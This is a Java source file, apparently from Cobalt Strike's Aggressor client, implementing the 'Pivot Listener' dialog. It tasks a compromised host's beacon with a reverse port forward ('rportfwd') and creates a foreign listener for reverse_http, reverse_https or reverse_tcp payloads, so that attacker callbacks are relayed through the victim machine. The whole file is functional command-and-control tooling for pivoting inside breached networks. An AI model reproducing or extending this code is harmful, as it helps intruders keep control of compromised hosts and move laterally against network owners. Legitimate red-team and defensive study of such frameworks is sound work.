package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.TaskBeacon;
import common.AObject;
import common.BeaconEntry;
import common.Callback;
import common.CommonUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.util.HashMap;

public class PivotListenerSetup
        extends AObject implements DialogListener,
        Callback {
    protected String bid;
    protected AggressorClient client;
    protected JFrame dialog = null;

    public PivotListenerSetup(AggressorClient client, String bid) {
        this.client = client;
        this.bid = bid;
    }

    @Override
    public void dialogAction(ActionEvent event, HashMap<String, Object> options) {
        String name = DialogUtils.string(options, "name");
        String lhost = DialogUtils.string(options, "lhost");
        int lport = DialogUtils.number(options, "lport");
        String fhost = DialogUtils.string(options, "fhost");
        int fport = DialogUtils.number(options, "fport");
        String payload = DialogUtils.string(options, "payload");
        TaskBeacon session = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
        DialogUtils.openOrActivate(this.client, this.bid);
        session.input("rportfwd " + lport + " " + fhost + " " + fport);
        session.PortForward(lport, fhost, fport);
        HashMap<String, String> optionz = new HashMap<>();
        optionz.put("payload", payload);
        optionz.put("port", lport + "");
        optionz.put("host", lhost);
        optionz.put("name", name);
        this.client.getConnection().call("listeners.create", CommonUtils.args(name, optionz), this);
    }

    @Override
    public void result(String method, Object data) {
        String message = data + "";
        if (message.equals("success")) {
            DialogUtils.showInfo("Started Listener");
        } else {
            DialogUtils.showError("Could not start listener: \n" + message);
        }
    }

    public void show() {
        this.dialog = DialogUtils.dialog("New Listener", 640, 480);
        this.dialog.setLayout(new BorderLayout());
        String[] payloads = CommonUtils.toArray("windows/foreign/reverse_http, windows/foreign/reverse_https, windows/foreign/reverse_tcp");
        DialogManager controller = new DialogManager(this.dialog);
        controller.addDialogListener(this);
        BeaconEntry entry = DataUtils.getBeacon(this.client.getData(), this.bid);
        controller.set("lhost", entry.getInternal());
        controller.set("fhost", DataUtils.getLocalIP(this.client.getData()));
        controller.text("name", "Name:", 20);
        controller.combobox("payload", "Payload:", payloads);
        controller.text("lhost", "Listen Host:", 20);
        controller.text("lport", "Listen Port:", 10);
        controller.text("fhost", "Remote Host:", 20);
        controller.text("fport", "Remote Port:", 10);
        JButton chooser = controller.action("Save");
        JButton help = controller.help("https://www.cobaltstrike.com/help-pivot-listener");
        this.dialog.add(DialogUtils.description("A pivot listener is a way to setup a foreign listener and a reverse port forward that relays traffic to it in one step."), "North");
        this.dialog.add(controller.layout(), "Center");
        this.dialog.add(DialogUtils.center(chooser, help), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}

